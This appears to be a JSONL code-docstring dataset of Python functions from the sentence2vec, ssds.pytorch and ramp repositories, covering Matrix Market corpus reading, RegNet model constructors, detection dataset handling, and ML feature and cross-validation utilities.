{"docstring": "\"\"\"\nIteratively yield vectors from the underlying file, in the format (row_no, vector),\nwhere vector is a list of (col_no, value) 2-tuples.\n\nNote that the total number of vectors returned is always equal to the\nnumber of rows specified in the header; empty documents are inserted and\nyielded where appropriate, even if they are not explicitly stored in the\nMatrix Market file.\n\"\"\"\n", "func_signal": "def __iter__(self):\n", "code": "with utils.file_or_filename(self.input) as lines:\n    self.skip_headers(lines)\n\n    previd = -1\n    for line in lines:\n        docid, termid, val = utils.to_unicode(line).split()  # needed for python3\n        if not self.transposed:\n            termid, docid = docid, termid\n        docid, termid, val = int(docid) - 1, int(termid) - 1, float(val) # -1 because matrix market indexes are 1-based => convert to 0-based\n        assert previd <= docid, \"matrix columns must come in ascending order\"\n        if docid != previd:\n            # change of document: return the document read so far (its id is prevId)\n            if previd >= 0:\n                yield previd, document\n\n            # return implicit (empty) documents between previous id and new id\n            # too, to keep consistent document numbering and corpus length\n            for previd in xrange(previd + 1, docid):\n                yield previd, []\n\n            # from now on start adding fields to a new document, with a new id\n            previd = docid\n            document = []\n\n        document.append((termid, val,)) # add another field to the current document\n\n# handle the last document, as a special case\nif previd >= 0:\n    yield previd, document\n\n# return empty documents between the last explicit document and the number\n# of documents as specified in the header\nfor previd in xrange(previd + 1, self.num_docs):\n    yield previd, []", "path": "matutils.py", "repo_name": "klb3713/sentence2vec", "stars": 666, "license": "None", "language": "python", "size": 198}
{"docstring": "\"\"\"Like `numpy.zeros()`, but the array will be aligned at `align` byte boundary.\"\"\"\n", "func_signal": "def zeros_aligned(shape, dtype, order='C', align=128):\n", "code": "nbytes = numpy.prod(shape, dtype=numpy.int64) * numpy.dtype(dtype).itemsize\nbuffer = numpy.zeros(nbytes + align, dtype=numpy.uint8)  # problematic on win64 (\"maximum allowed dimension exceeded\")\nstart_index = -buffer.ctypes.data % align\nreturn buffer[start_index : start_index + nbytes].view(dtype).reshape(shape, order=order)", "path": "matutils.py", "repo_name": "klb3713/sentence2vec", "stars": 666, "license": "None", "language": "python", "size": 198}
{"docstring": "\"\"\"\nLike `full2sparse`, but only return the `topn` elements of the greatest magnitude (abs).\n\n\"\"\"\n# use numpy.argsort and only form tuples that are actually returned.\n# this is about 40x faster than explicitly forming all 2-tuples to run sort() or heapq.nlargest() on.\n", "func_signal": "def full2sparse_clipped(vec, topn, eps=1e-9):\n", "code": "if topn <= 0:\n    return []\nvec = numpy.asarray(vec, dtype=float)\nnnz = numpy.nonzero(abs(vec) > eps)[0]\nbiggest = nnz.take(argsort(vec.take(nnz), topn))\nreturn list(zip(biggest, vec.take(biggest)))", "path": "matutils.py", "repo_name": "klb3713/sentence2vec", "stars": 666, "license": "None", "language": "python", "size": 198}
{"docstring": "\"\"\"\nInitialize the matrix reader.\n\nThe `input` refers to a file on local filesystem, which is expected to\nbe in the sparse (coordinate) Matrix Market format. Documents are assumed\nto be rows of the matrix (and document features are columns).\n\n`input` is either a string (file path) or a file-like object that supports\n`seek()` (e.g. gzip.GzipFile, bz2.BZ2File).\n\"\"\"\n", "func_signal": "def __init__(self, input, transposed=True):\n", "code": "logger.info(\"initializing corpus reader from %s\" % input)\nself.input, self.transposed = input, transposed\nwith utils.file_or_filename(self.input) as lines:\n    try:\n        header = utils.to_unicode(next(lines)).strip()\n        if not header.lower().startswith('%%matrixmarket matrix coordinate real general'):\n            raise ValueError(\"File %s not in Matrix Market format with coordinate real general; instead found: \\n%s\" %\n                            (self.input, header))\n    except StopIteration:\n        pass\n\n    self.num_docs = self.num_terms = self.num_nnz = 0\n    for lineno, line in enumerate(lines):\n        line = utils.to_unicode(line)\n        if not line.startswith('%'):\n            self.num_docs, self.num_terms, self.num_nnz = map(int, line.split())\n            if not self.transposed:\n                self.num_docs, self.num_terms = self.num_terms, self.num_docs\n            break\n\nlogger.info(\"accepted corpus with %i documents, %i features, %i non-zero entries\" %\n             (self.num_docs, self.num_terms, self.num_nnz))", "path": "matutils.py", "repo_name": "klb3713/sentence2vec", "stars": 666, "license": "None", "language": "python", "size": 198}
{"docstring": "\"\"\"\nWhich word from the given list doesn't go with the others?\n\nExample::\n\n  >>> trained_model.doesnt_match(\"breakfast cereal dinner lunch\".split())\n  'cereal'\n\n\"\"\"\n", "func_signal": "def doesnt_match(self, words):\n", "code": "self.init_sims()\n\nwords = [word for word in words if word in self.vocab]  # filter out OOV words\nlogger.debug(\"using words %s\" % words)\nif not words:\n    raise ValueError(\"cannot select a word from an empty list\")\nvectors = vstack(self.syn0norm[self.vocab[word].index] for word in words).astype(REAL)\nmean = matutils.unitvec(vectors.mean(axis=0)).astype(REAL)\ndists = dot(vectors, mean)\nreturn sorted(zip(dists, words))[0][1]", "path": "word2vec.py", "repo_name": "klb3713/sentence2vec", "stars": 666, "license": "None", "language": "python", "size": 198}
{"docstring": "\"\"\"\nReturn QR decomposition of `la[0]`. Content of `la` gets destroyed in the process.\n\nUsing this function should be less memory intense than calling `scipy.linalg.qr(la[0])`,\nbecause the memory used in `la[0]` is reclaimed earlier.\n\"\"\"\n", "func_signal": "def qr_destroy(la):\n", "code": "a = numpy.asfortranarray(la[0])\ndel la[0], la # now `a` is the only reference to the input matrix\nm, n = a.shape\n# perform q, r = QR(a); code hacked out of scipy.linalg.qr\nlogger.debug(\"computing QR of %s dense matrix\" % str(a.shape))\ngeqrf, = get_lapack_funcs(('geqrf',), (a,))\nqr, tau, work, info = geqrf(a, lwork=-1, overwrite_a=True)\nqr, tau, work, info = geqrf(a, lwork=work[0], overwrite_a=True)\ndel a # free up mem\nassert info >= 0\nr = triu(qr[:n, :n])\nif m < n: # rare case, #features < #topics\n    qr = qr[:, :m] # retains fortran order\ngorgqr, = get_lapack_funcs(('orgqr',), (qr,))\nq, work, info = gorgqr(qr, tau, lwork=-1, overwrite_a=True)\nq, work, info = gorgqr(qr, tau, lwork=work[0], overwrite_a=True)\nassert info >= 0, \"qr failed\"\nassert q.flags.f_contiguous\nreturn q, r", "path": "matutils.py", "repo_name": "klb3713/sentence2vec", "stars": 666, "license": "None", "language": "python", "size": 198}
{"docstring": "'''\n:meta private:\n'''\n", "func_signal": "def loading_pickle(self, pickle_path):\n", "code": "sys.stdout.write('\\rLoading Pickle from {}\\n'.format(pickle_path))\nwith open(pickle_path, 'rb') as handle:\n    return pickle.load(handle)", "path": "ssds\\dataset\\detection_dataset.py", "repo_name": "ShuangXieIrene/ssds.pytorch", "stars": 569, "license": "mit", "language": "python", "size": 4259}
{"docstring": "\"\"\" current version for generate the anchor, only generate the default anchor for each feature map layers\nReturns:\n    anchors: OrderedDict(key=stride, value=default_anchors)\n\"\"\"\n", "func_signal": "def create_anchors(cfg, model, image_size, visualize=False):\n", "code": "model.eval()\nwith torch.no_grad():\n    x = torch.rand(\n        (1, 3, image_size[0], image_size[1]), device=next(model.parameters()).device\n    )\n    conf = model(x)[-1]\n    strides = [x.shape[-1] // c.shape[-1] for c in conf]\n\nratios, scales = configure_ratio_scale(len(strides), cfg.ASPECT_RATIOS, cfg.SIZES)\nanchors = OrderedDict(\n    [\n        (strides[i], generate_anchors(strides[i], ratios[i], scales[i]))\n        for i in range(len(strides))\n    ]\n)\nif visualize:\n    print(\"Anchor Boxs (width, height)\")\n    [\n        print(\"Stride {}: {}\".format(k, (v[:, 2:] - v[:, :2] + 1).int().tolist()))\n        for k, v in anchors.items()\n    ]\nreturn anchors", "path": "ssds\\modeling\\model_builder.py", "repo_name": "ShuangXieIrene/ssds.pytorch", "stars": 569, "license": "mit", "language": "python", "size": 4259}
{"docstring": "\"\"\" s1-4: {72, 168, 408, 912} \"\"\"\n", "func_signal": "def RegNetX016(outputs, **kwargs):\n", "code": "model = RegNet(\n    w_a=34.01,\n    w_0=80,\n    w_m=2.25,\n    d=18,\n    group_w=24,\n    bot_mul=1,\n    outputs=outputs,\n    url=base_url + model_urls[\"RegNetX016\"],\n    **kwargs\n)\nreturn model", "path": "ssds\\modeling\\nets\\regnet.py", "repo_name": "ShuangXieIrene/ssds.pytorch", "stars": 569, "license": "mit", "language": "python", "size": 4259}
{"docstring": "\"\"\"\nConstruct an image path from the image's \"index\" identifier.\nExample image path for index=119993:\nimages/train2014/COCO_train2014_000000119993.jpg\n\"\"\"\n", "func_signal": "def image_path_from_index(self, name, index):\n", "code": "file_name = (str(index).zfill(12) + '.jpg')\nimage_path = os.path.join(self.dataset_dir, 'images',\n                      name, file_name)\nassert os.path.exists(image_path), \\\n        'Path does not exist: {}'.format(image_path)\nreturn image_path", "path": "ssds\\dataset\\coco.py", "repo_name": "ShuangXieIrene/ssds.pytorch", "stars": 569, "license": "mit", "language": "python", "size": 4259}
{"docstring": "\"\"\" s1-4: {80, 240, 720, 1920} \"\"\"\n", "func_signal": "def RegNetX080(outputs, **kwargs):\n", "code": "model = RegNet(\n    w_a=49.56,\n    w_0=80,\n    w_m=2.88,\n    d=23,\n    group_w=120,\n    bot_mul=1,\n    outputs=outputs,\n    url=base_url + model_urls[\"RegNetX080\"],\n    **kwargs\n)\nreturn model", "path": "ssds\\modeling\\nets\\regnet.py", "repo_name": "ShuangXieIrene/ssds.pytorch", "stars": 569, "license": "mit", "language": "python", "size": 4259}
{"docstring": "\"\"\" s1-4: {256, 512, 896, 2048} \"\"\"\n", "func_signal": "def RegNetX160(outputs, **kwargs):\n", "code": "model = RegNet(\n    w_a=55.59,\n    w_0=216,\n    w_m=2.1,\n    d=22,\n    group_w=128,\n    bot_mul=1,\n    outputs=outputs,\n    url=base_url + model_urls[\"RegNetX160\"],\n    **kwargs\n)\nreturn model", "path": "ssds\\modeling\\nets\\regnet.py", "repo_name": "ShuangXieIrene/ssds.pytorch", "stars": 569, "license": "mit", "language": "python", "size": 4259}
{"docstring": "\"\"\"Gets ws/ds of network at each stage from per block values.\"\"\"\n", "func_signal": "def get_stages_from_blocks(ws, rs):\n", "code": "ts_temp = zip(ws + [0], [0] + ws, rs + [0], [0] + rs)\nts = [w != wp or r != rp for w, wp, r, rp in ts_temp]\ns_ws = [w for w, t in zip(ws, ts[:-1]) if t]\ns_ds = np.diff([d for d, t in zip(range(len(ts)), ts) if t]).tolist()\nreturn s_ws, s_ds", "path": "ssds\\modeling\\nets\\regnet.py", "repo_name": "ShuangXieIrene/ssds.pytorch", "stars": 569, "license": "mit", "language": "python", "size": 4259}
{"docstring": "# 0. prepare video\n", "func_signal": "def demo_video(model, video_path, display):\n", "code": "cap    = cv2.VideoCapture(video_path)\nframes = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))\nif cap.isOpened() and (not display): \n    width  = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))\n    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))\n    fourcc = cv2.VideoWriter_fourcc(*'mp4v')\n    fps    = int(cap.get(cv2.CAP_PROP_FPS))\n    writer = cv2.VideoWriter(video_path+\"_output.mp4\", fourcc, fps, (width,height))\n\nfor fid in tqdm(range(frames)):\n    # 1. prepare image\n    flag, image = cap.read()\n    image = cv2.resize(image, model.image_size)\n\n    # 2. model infer\n    scores, boxes, classes = model(image)\n\n    # 3. draw bounding box on the image\n    for score, box, labels in zip(scores, boxes, classes):\n        plot_one_box(image, box, COLORS[labels % 3], '{label}: {score:.3f}'.format(label=labels, score=score))\n\n    image = cv2.resize(image, (width,height))\n\n    # 4. visualize result\n    if display:\n        cv2.imshow(\"Image\", image)\n        if cv2.waitKey(1) & 0xFF == ord('q'):\n            break\n    else:\n        writer.write(image)\n    \n# 5. release the video resources\ncap.release()\nif display:\n    cv2.destroyAllWindows()\nelse:\n    writer.release()", "path": "demo.py", "repo_name": "ShuangXieIrene/ssds.pytorch", "stars": 569, "license": "mit", "language": "python", "size": 4259}
{"docstring": "\"\"\"Custom collate fn for dealing with batches of images that have a different\nnumber of associated object annotations (bounding boxes).\nArguments:\n    batch: (tuple) A tuple of tensor images and lists of annotations\nReturn:\n    A tuple containing:\n        1) (tensor) batch of images stacked on their 0 dim\n        2) (tensors) annotations for a given image are stacked on 0 dim\n\"\"\"\n", "func_signal": "def detection_collate(batch):\n", "code": "targets = []\nimgs = []\nnum_detections = []\nfor img, target in batch:\n    # for tup in sample:\n    imgs.append(img)\n    targets.append(target)\n    num_detections.append(target.shape[0])\n\ntorch_targets = -1 * torch.ones(\n    [len(targets), max(max(num_detections), 1), 5], dtype=torch.float, device=\"cpu\"\n)\nfor i, target in enumerate(targets):\n    num_dets = target.shape[0]\n    torch_targets[i, :num_dets] = torch.from_numpy(target).float()\nreturn torch.stack(imgs, 0), torch_targets", "path": "ssds\\dataset\\dataset_factory.py", "repo_name": "ShuangXieIrene/ssds.pytorch", "stars": 569, "license": "mit", "language": "python", "size": 4259}
{"docstring": "\"\"\" s1-4: {80, 240, 560, 1360} \"\"\"\n", "func_signal": "def RegNetX040(outputs, **kwargs):\n", "code": "model = RegNet(\n    w_a=38.65,\n    w_0=96,\n    w_m=2.43,\n    d=23,\n    group_w=40,\n    bot_mul=1,\n    outputs=outputs,\n    url=base_url + model_urls[\"RegNetX040\"],\n    **kwargs\n)\nreturn model", "path": "ssds\\modeling\\nets\\regnet.py", "repo_name": "ShuangXieIrene/ssds.pytorch", "stars": 569, "license": "mit", "language": "python", "size": 4259}
{"docstring": "# 1. prepare image\n", "func_signal": "def demo_image(model, image_path, display):\n", "code": "image = cv2.imread(image_path)\nimage = cv2.resize(image, model.image_size)\n\n# 2. model infer\nscores, boxes, classes = model(image)\n\n# 3. draw bounding box on the image\nfor score, box, labels in zip(scores, boxes, classes):\n    plot_one_box(image, box, COLORS[labels % 3], '{label}: {score:.3f}'.format(label=labels, score=score))\n\n# 4. visualize result\nif display:\n    cv2.imshow('result', image)\n    cv2.waitKey(0)\nelse:\n    path, _ = os.path.splitext(image_path)\n    cv2.imwrite(path + '_result.jpg', image)\n    print(\"output file save at '{}'\".format(path + '_result.jpg'))", "path": "demo.py", "repo_name": "ShuangXieIrene/ssds.pytorch", "stars": 569, "license": "mit", "language": "python", "size": 4259}
{"docstring": "# super(DetectionDataset, self).__init__()\n", "func_signal": "def __init__(self, cfg, is_train, transform=None):\n", "code": "self.is_train = is_train\n\nself.image_size = cfg.IMAGE_SIZE\n# self.num_classes = cfg.NUM_CLASSES\n# self.classes_names = cfg.CLASSES_NAME\nself.preproc_param = cfg.PREPROC\nself.using_pickle = cfg.PICKLE\nself.transform = transform\n\nself.db = []\nself.img_db = []\nself._init_transform()", "path": "ssds\\dataset\\detection_dataset.py", "repo_name": "ShuangXieIrene/ssds.pytorch", "stars": 569, "license": "mit", "language": "python", "size": 4259}
{"docstring": "\"\"\" s1-4: {48, 96, 240, 528} \"\"\"\n", "func_signal": "def RegNetX006(outputs, **kwargs):\n", "code": "model = RegNet(\n    w_a=36.97,\n    w_0=48,\n    w_m=2.24,\n    d=16,\n    group_w=24,\n    bot_mul=1,\n    outputs=outputs,\n    url=base_url + model_urls[\"RegNetX006\"],\n    **kwargs\n)\nreturn model", "path": "ssds\\modeling\\nets\\regnet.py", "repo_name": "ShuangXieIrene/ssds.pytorch", "stars": 569, "license": "mit", "language": "python", "size": 4259}
{"docstring": "# Plots one bounding box on image img\n", "func_signal": "def plot_one_box(img, x, color=None, label=None, line_thickness=None):\n", "code": "tl = line_thickness or round(0.002 * (img.shape[0] + img.shape[1]) / 2) + 1  # line/font thickness\ncolor = color or [random.randint(0, 255) for _ in range(3)]\nc1, c2 = (int(x[0]), int(x[1])), (int(x[2]), int(x[3]))\ncv2.rectangle(img, c1, c2, color, thickness=tl, lineType=cv2.LINE_AA)\nif label:\n    tf = max(tl - 1, 1)  # font thickness\n    t_size = cv2.getTextSize(label, 0, fontScale=tl / 3, thickness=tf)[0]\n    c2 = c1[0] + t_size[0], c1[1] - t_size[1] - 3\n    cv2.rectangle(img, c1, c2, color, -1, cv2.LINE_AA)  # filled\n    cv2.putText(img, label, (c1[0], c1[1] - 2), 0, tl / 3, [225, 255, 255], thickness=tf, lineType=cv2.LINE_AA)", "path": "demo.py", "repo_name": "ShuangXieIrene/ssds.pytorch", "stars": 569, "license": "mit", "language": "python", "size": 4259}
{"docstring": "\"\"\"\nThis code is from\nhttps://github.com/yqyao/FCOS_PLUS/blob/0d20ba34ccc316650d8c30febb2eb40cb6eaae37/\nmaskrcnn_benchmark/modeling/rpn/fcos/loss.py#L42\n\"\"\"\n# get mins and maxs value for center boarder\n", "func_signal": "def get_sample_region(boxes, stride, anchor_points, radius=1.5):\n", "code": "stride = stride * radius\ncenter = (boxes[:, :2] + boxes[:, 2:]) / 2\ncenter_boxes = torch.cat((center - stride, center + stride), dim=-1)\n\n# generate the difference between grid points and center boarder\n# to check whether it is located in the center areas\nlt = (\n    anchor_points[:, :, None, :]\n    - torch.max(center_boxes[:, :2], boxes[:, :2])[None, None, :]\n)\nrb = (\n    torch.min(center_boxes[:, 2:], boxes[:, 2:])[None, None, :]\n    - anchor_points[:, :, None, :]\n)\ncenter_boxes = torch.cat((lt, rb), -1)\ninside_boxes_mask = center_boxes.min(-1)[0] > 0\nreturn inside_boxes_mask", "path": "ssds\\modeling\\layers\\box.py", "repo_name": "ShuangXieIrene/ssds.pytorch", "stars": 569, "license": "mit", "language": "python", "size": 4259}
{"docstring": "\"\"\"\nLoads COCO bounding-box instance annotations. Crowd instances are\nhandled by marking their overlaps (with all categories) to -1. This\noverlap value means that crowd \"instances\" are excluded from training.\nReturn result with Percent Coords\n\"\"\"\n", "func_signal": "def annotation_from_index(self, index, _COCO, toPercent=True):\n", "code": "im_ann = _COCO.loadImgs(index)[0]\nwidth = im_ann['width']\nheight = im_ann['height']\n\nannIds = _COCO.getAnnIds(imgIds=index, iscrowd=None)\nobjs = _COCO.loadAnns(annIds)\n# Sanitize bboxes -- some are invalid\nvalid_objs = []\nfor obj in objs:\n    x1 = np.max((0, obj['bbox'][0]))\n    y1 = np.max((0, obj['bbox'][1]))\n    x2 = np.min((width - 1, x1 + np.max((0, obj['bbox'][2] - 1))))\n    y2 = np.min((height - 1, y1 + np.max((0, obj['bbox'][3] - 1))))\n    if obj['area'] > 0 and x2 >= x1 and y2 >= y1:\n        obj['clean_bbox'] = [x1, y1, x2, y2]\n        valid_objs.append(obj)\n\n# Lookup table to map from COCO category ids to our internal class\n# indices\ncoco_cat_id_to_class_ind = dict([(self._class_to_coco_cat_id[name],\n                                  self._class_to_ind[name])\n                                 for name in self.classes_names])\n\nres = np.zeros((len(valid_objs), 5), dtype=np.float32)\nfor ix, obj in enumerate(valid_objs):\n    clss = coco_cat_id_to_class_ind[obj['category_id']]\n    res[ix, 0:4] = obj['clean_bbox']\n    res[ix, 4] = clss\n\nif toPercent == True:\n    res[:,:4:2] /= width\n    res[:,1:4:2] /= height\nreturn res", "path": "ssds\\dataset\\coco.py", "repo_name": "ShuangXieIrene/ssds.pytorch", "stars": 569, "license": "mit", "language": "python", "size": 4259}
{"docstring": "\"\"\" s1-4: {24, 56, 368, 152} \"\"\"\n", "func_signal": "def RegNetX002(outputs, **kwargs):\n", "code": "model = RegNet(\n    w_a=36.44,\n    w_0=24,\n    w_m=2.49,\n    d=13,\n    group_w=8,\n    bot_mul=1,\n    outputs=outputs,\n    url=base_url + model_urls[\"RegNetX002\"],\n    **kwargs\n)\nreturn model", "path": "ssds\\modeling\\nets\\regnet.py", "repo_name": "ShuangXieIrene/ssds.pytorch", "stars": 569, "license": "mit", "language": "python", "size": 4259}
{"docstring": "\"\"\" s1-4: {32, 64, 160, 384} \"\"\"\n", "func_signal": "def RegNetX004(outputs, **kwargs):\n", "code": "model = RegNet(\n    w_a=24.48,\n    w_0=24,\n    w_m=2.54,\n    d=22,\n    group_w=16,\n    bot_mul=1,\n    outputs=outputs,\n    url=base_url + model_urls[\"RegNetX004\"],\n    **kwargs\n)\nreturn model", "path": "ssds\\modeling\\nets\\regnet.py", "repo_name": "ShuangXieIrene/ssds.pytorch", "stars": 569, "license": "mit", "language": "python", "size": 4259}
{"docstring": "\"\"\"Adjusts the compatibility of widths and groups.\"\"\"\n", "func_signal": "def adjust_ws_gs_comp(ws, bms, gs):\n", "code": "ws_bot = [int(w * b) for w, b in zip(ws, bms)]\ngs = [min(g, w_bot) for g, w_bot in zip(gs, ws_bot)]\nws_bot = [quantize_float(w_bot, g) for w_bot, g in zip(ws_bot, gs)]\nws = [int(w_bot / b) for w_bot, b in zip(ws_bot, bms)]\nreturn ws, gs", "path": "ssds\\modeling\\nets\\regnet.py", "repo_name": "ShuangXieIrene/ssds.pytorch", "stars": 569, "license": "mit", "language": "python", "size": 4259}
{"docstring": "''' reorder the db based on the cfg_joints_name\n\n:meta private:\n'''\n", "func_signal": "def reorder_data(self, db, cfg_joints_name, ds_joints_name):\n", "code": "order = []\nfor cfg_name in cfg_joints_name:\n    if cfg_name in ds_joints_name:\n        order.append(ds_joints_name.index(cfg_name))\n    else:\n        order.append(-1)\norder = np.array(order)\n\nraise NotImplementedError\nreturn db", "path": "ssds\\dataset\\detection_dataset.py", "repo_name": "ShuangXieIrene/ssds.pytorch", "stars": 569, "license": "mit", "language": "python", "size": 4259}
{"docstring": "# For trained features, we will need access to all the data\n", "func_signal": "def __init__(self):\n", "code": "self.feature = AllDataFeature()\nsuper(TrainedFeature, self).__init__(self.feature)", "path": "ramp\\features\\trained.py", "repo_name": "kvh/ramp", "stars": 653, "license": "mit", "language": "python", "size": 734}
{"docstring": "# TODO: not sure how to prep this... need to recreate \n# inherited feature to get at its prepped data\n", "func_signal": "def _apply(self, data, fitted_feature):\n", "code": "data = super(SelectNgramCounts, self)._create(data)\ncols = self.get_prep_data(data)\nreturn data[cols]", "path": "ramp\\features\\text.py", "repo_name": "kvh/ramp", "stars": 653, "license": "mit", "language": "python", "size": 734}
{"docstring": "# Assumes positive is constrained (rarer) class\n", "func_signal": "def from_percents(self):\n", "code": "rp = self.train_percent * self.n_positives\ntp = (1 - self.train_percent) * self.n_positives\nrn = rp / self.train_pos_percent - rp\ntn = tp / self.test_pos_percent - tp\ntrain_neg = pd.Index(np.random.choice(self.negatives,\n                                      int(rn),\n                                      replace=True))\ntest_neg = pd.Index(np.random.choice(self.negatives - train_neg,\n                                     int(tn),\n                                     replace=True))\ntrain_pos = pd.Index(np.random.choice(self.positives,\n                                      int(rp),\n                                      replace=True))\ntest_pos = pd.Index(np.random.choice(self.positives - train_pos,\n                                     int(tp),\n                                     replace=True))\nreturn train_neg, test_neg, train_pos, test_pos", "path": "ramp\\folds.py", "repo_name": "kvh/ramp", "stars": 653, "license": "mit", "language": "python", "size": 734}
{"docstring": "# test multi-class\n", "func_signal": "def test_sklearn_probabilities(self):\n", "code": "self.data['target'] = [0] * 5 + [1] * 3 + [2] * 2\ninner_est = linear_model.LogisticRegression()\nest = wrap_sklearn_like_estimator(inner_est)\nx = self.data[['a', 'b']]\nest.fit(x, self.data.target)\npreds = est.predict(x)\nself.assertEqual(preds.shape, (10, 3))\n\n# test binary, single output\nself.data['target'] = [0] * 5 + [1] * 5\nest = BinaryProbabilities(inner_est)\nx = self.data[['a', 'b']]\nest.fit(x, self.data.target)\npreds = est.predict(x)\nself.assertEqual(preds.shape, (10, ))", "path": "ramp\\tests\\test_estimators.py", "repo_name": "kvh/ramp", "stars": 653, "license": "mit", "language": "python", "size": 734}
{"docstring": "# create a unique index for this text\n", "func_signal": "def probability_of_insult(config, ctx, txt):\n", "code": "idx = int(md5(txt).hexdigest()[:10], 16)\n\n# add the new comment to our DataFrame\nd = DataFrame(\n        {'Comment':[txt]},\n        index=pandas.Index([idx]))\nctx.data = ctx.data.append(d)\n\n# Specify which instances to predict with predict_index\n# and make the prediction\npred, predict_x, predict_y = models.predict(\n        config,\n        ctx,\n        predict_index=pandas.Index([idx]))\n\nreturn pred[idx]", "path": "examples\\classify_insults.py", "repo_name": "kvh/ramp", "stars": 653, "license": "mit", "language": "python", "size": 734}
{"docstring": "\"\"\"\nLike unique_name, but in addition must be unique to each column of this\nfeature. accomplishes this by prepending readable string to existing\ncolumn name and replacing unique hash at end of column name.\n\"\"\"\n", "func_signal": "def column_rename(self, existing_name, hsh=None):\n", "code": "try:\n    existing_name = str(existing_name)\nexcept UnicodeEncodeError:\n    pass\nif hsh is None:\n    hsh = self._hash()\nif self._name:\n    return '%s(%s) [%s]' %(self._name, self._remove_hashes(existing_name),\n            hsh)\nreturn '%s [%s]'%(self._remove_hashes(existing_name),\n            hsh)", "path": "ramp\\features\\base.py", "repo_name": "kvh/ramp", "stars": 653, "license": "mit", "language": "python", "size": 734}
{"docstring": "\"\"\"\n\"\"\"\n", "func_signal": "def cross_validate(model_def, data, folds, repeat=1):\n", "code": "results = []\n\nif isinstance(folds, int):\n    folds = make_default_folds(num_folds=folds, data=data)\n\nfor i in range(repeat):\n    for fold in folds:\n        if len(fold) == 2:\n            train_index, test_index = fold\n            prep_index = None\n        elif len(fold) == 3:\n            train_index, test_index, prep_index = fold\n        else:\n            raise ValueError(\"Fold is not of right dimension (%d, not 2 or 3)\"%len(fold))\n        assert len(train_index & test_index) == 0, \"train and test overlap!!! %s, %s\" % (train_index, test_index)\n        x_train, y_train, fitted_model = fit_model(model_def, data, prep_index, train_index)\n        test_data = data.loc[test_index]\n        x_test, y_test = generate_test(model_def, test_data, fitted_model)\n        assert len(x_train.index & x_test.index) == 0, \"train and test overlap!!! %s\" % (x_train.index & x_test.index)\n        y_preds = predict(fitted_model, x_test)\n        if model_def.evaluation_target is not None:\n            y_test, ff = build_target_safe(model_def.evaluation_target, test_data)\n        result = Result(x_train, x_test, y_train, y_test, y_preds, model_def, fitted_model, data)\n        results.append(result)\n\n        # for reporter in reporters:\n        #     reporter.update(result)\nreturn results", "path": "ramp\\modeling.py", "repo_name": "kvh/ramp", "stars": 653, "license": "mit", "language": "python", "size": 734}
{"docstring": "\"\"\" levels is list of tuples \"\"\"\n", "func_signal": "def __init__(self, feature, levels=None):\n", "code": "super(AsFactor, self).__init__(feature)\nself.levels = levels", "path": "ramp\\features\\base.py", "repo_name": "kvh/ramp", "stars": 653, "license": "mit", "language": "python", "size": 734}
{"docstring": "\"\"\"\nInheriting classes responsible for setting human-readable description of\nfeature and parameters on _name attribute.\n\"\"\"\n", "func_signal": "def __init__(self, features):\n", "code": "self.set_features(features)\nself.set_name()", "path": "ramp\\features\\base.py", "repo_name": "kvh/ramp", "stars": 653, "license": "mit", "language": "python", "size": 734}
{"docstring": "# good features\n", "func_signal": "def test_feature_builders(self):\n", "code": "features = [base.F(10), base.F('a')]\nfeatureset, fitted_features = build_featureset_safe(features, self.data)\nself.assertEqual(featureset.shape, (len(self.data), 2))\nfeatureset = apply_featureset_safe(features, self.data, fitted_features)\nself.assertEqual(featureset.shape, (len(self.data), 2))\n\n# bad feature, drops data\nclass BuggyFeature(base.F):\n    def _apply(self, data, fitted_feature):\n        return data.iloc[:len(data)/2]\nfeatures = [base.F(10), base.F('a'), BuggyFeature('a')]\nwith self.assertRaises(AssertionError):\n    featureset, ffs = build_featureset_safe(features, self.data)\n\n# target\nfeatureset, fitted_feature = build_target_safe(base.F('a'), self.data)\nself.assertEqual(featureset.shape, (len(self.data), ))\nself.assertTrue(isinstance(featureset, Series))\nfeatureset = apply_target_safe(base.F('a'), self.data, fitted_feature)\nself.assertEqual(featureset.shape, (len(self.data), ))\nself.assertTrue(isinstance(featureset, Series))", "path": "ramp\\tests\\test_features.py", "repo_name": "kvh/ramp", "stars": 653, "license": "mit", "language": "python", "size": 734}
{"docstring": "# TODO: this doesnt exist anymore\n", "func_signal": "def make_docs(self, data):\n", "code": "sents = []\nfor txt in data:\n    sents.extend(sent_tokenizer.tokenize(txt))\ndocs = [self.tokenizer(d) for d in sents]\nlogging.info(\"docs:\\n\" + str(docs[0][:20]))\nself._docs_hash = self.make_docs_hash(docs)\nreturn docs", "path": "ramp\\features\\text.py", "repo_name": "kvh/ramp", "stars": 653, "license": "mit", "language": "python", "size": 734}
{"docstring": "# create test set\n", "func_signal": "def generate_test(model_def, predict_data, fitted_model, compute_actuals=True):\n", "code": "predict_data = filter_data(model_def, predict_data)\nx_test = apply_featureset_safe(model_def.features, predict_data, fitted_model.fitted_features)\nif compute_actuals:\n    y_test = apply_target_safe(model_def.target, predict_data, fitted_model.fitted_target)\nelse:\n    y_test = None\nreturn x_test, y_test", "path": "ramp\\modeling.py", "repo_name": "kvh/ramp", "stars": 653, "license": "mit", "language": "python", "size": 734}
{"docstring": "# create training set\n", "func_signal": "def generate_train(model_def, data, prep_index=None, train_index=None):\n", "code": "data, prep_index, train_index = filter_data_and_indexes(model_def, data, prep_index, train_index)\nx_train, fitted_features = build_featureset_safe(model_def.features, data, prep_index, train_index)\ny_train, fitted_target = build_target_safe(model_def.target, data, prep_index, train_index)\nx_train = x_train.reindex(train_index)\ny_train = y_train.reindex(train_index)\nreturn x_train, y_train, fitted_features, fitted_target", "path": "ramp\\modeling.py", "repo_name": "kvh/ramp", "stars": 653, "license": "mit", "language": "python", "size": 734}
{"docstring": "#TODO: There should be an option for computing y_train_predictions\n", "func_signal": "def fit_model(model_def, data, prep_index=None, train_index=None, **fit_args):\n", "code": "x_train, y_train, fitted_features, fitted_target = generate_train(model_def,\n                                                                  data,\n                                                                  prep_index,\n                                                                  train_index)\n\n# fit estimator\nif fit_args:\n    model_def.estimator.fit(x_train, y_train, **fit_args)\nelse:\n    model_def.estimator.fit(x_train, y_train)\n\nfitted_estimator = model_def.estimator\n\nfitted_model = FittedModel(model_def, fitted_features, fitted_target, fitted_estimator)\nreturn x_train, y_train, fitted_model", "path": "ramp\\modeling.py", "repo_name": "kvh/ramp", "stars": 653, "license": "mit", "language": "python", "size": 734}
